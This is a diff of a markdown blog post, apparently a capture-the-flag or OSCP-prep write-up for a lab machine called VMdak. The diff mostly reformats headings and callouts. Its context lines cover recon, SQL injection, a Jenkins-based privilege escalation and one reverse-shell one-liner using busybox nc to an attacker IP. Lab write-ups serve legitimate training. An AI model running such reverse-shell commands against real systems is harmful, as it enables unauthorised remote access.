@@ -1,18 +1,14 @@
 ---
 layout: /src/layouts/PostLayout.astro
-title: Lavita
-tags: []
+title: VMdak
+tags: ["Jenkins"]
 ---
 **Start 11:33 07-02-2025**
 
 ---
-```
-Scope:
-IP_ADDR
-```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV -vvvv -Pn -p- vmdak -sT --min-rate=5000 -T5
@@ -58,7 +54,7 @@ Starting off with FTP I was able to anon login and get a file.
 ![](../../../assets/2dcfa0466ead5d86789a7b87e5c07552.png)
 
 
-# 9443/TCP - HTTPS
+### 9443/TCP - HTTPS
 
 ![](../../../assets/74df86b8cc448b7e85bac9ac06c58c84.png)
 
@@ -74,9 +70,10 @@ Looking it up I found a SQLi vulnerability
 
 Nice, let's enumerate the website and see what we can find.
 
->[!note]
->For persistence we got the creds here:
->![](../../../assets/d9bdecbfbe30474585a3fd8f7ffc5f88.png)
+:::note
+For persistence we got the creds here:
+![](../../../assets/d9bdecbfbe30474585a3fd8f7ffc5f88.png)
+:::
 
 ![](../../../assets/fbb9afee5fb00ad1d4257b1406d3e291.png)
 
@@ -95,8 +92,9 @@ And looking up further exploits online we find [this blog post](https://packetst
 
 ## Burpsuite
 
->[!note]
->We will now open up `burpsuite` where we will turn *ON* Intercept so we can modify the Request.
+:::note
+We will now open up `burpsuite` where we will turn *ON* Intercept so we can modify the Request.
+:::
 
 And in Burp we get this Request.
 
@@ -117,7 +115,7 @@ Let's test out if it worked:
 Awesome, let's start modifying the request so we can get a reverse shell.
 
 
-# Foothold
+## Foothold
 
 ```bash
 # Original payload
@@ -134,7 +132,7 @@ busybox nc 192.168.45.228 443 -e bash
 Now that we have RCE we can get to enumerating.
 
 
-## Enumeration
+### Enumeration
 
 ![](../../../assets/cb7d56e9324cfa5b06ab5240ab388781.png)
 
@@ -163,14 +161,14 @@ Unfortunately `sudo -l` won't be possible.
 ![](../../../assets/1fe6d80bebecd068149b749b14780bb4.png)
 
 
-# Privilege Escalation
+## Privilege Escalation
 
 We will start over by downloading over necessary tools.
 
 ![](../../../assets/c342b52aeeecd6763111b868b9cc47a3.png)
 
 
-## LinPEAS
+### LinPEAS
 
 I didn't find anything useful except this line:
 
@@ -190,7 +188,7 @@ We should try port forwarding and see what we can find.
 Now that the port forward has been setup we can access port `8080`.
 
 
-## 8080/TCP - HTTP (Port Forward)
+### 8080/TCP - HTTP (Port Forward)
 
 ![](../../../assets/9568a3fd7fbe17fe901c673fdc4c4149.png)
 
@@ -235,9 +233,10 @@ We will then click **Build Now** and let it run, after a while we should receive
 
 ![](../../../assets/d001b951fd71f4fed0454e850a6f756b.png)
 
->[!fail]
->This threw errors as it couldn't reach me, thus I had to add a listener on Ligolo first.
->![](../../../assets/6a815c2f30707b888c3c0b789ea4b12c.png)
+:::fail
+This threw errors as it couldn't reach me, thus I had to add a listener on Ligolo first.
+![](../../../assets/6a815c2f30707b888c3c0b789ea4b12c.png)
+:::
 
 ![](../../../assets/adc0e36001094b453a79ee7f62516217.png)
 
@@ -257,5 +256,3 @@ Now it went through the way it should!
 **Finished 12:54 07-02-2025**
 
 [^Links]: [[OSCP Prep]]
-
-#Jenkins 
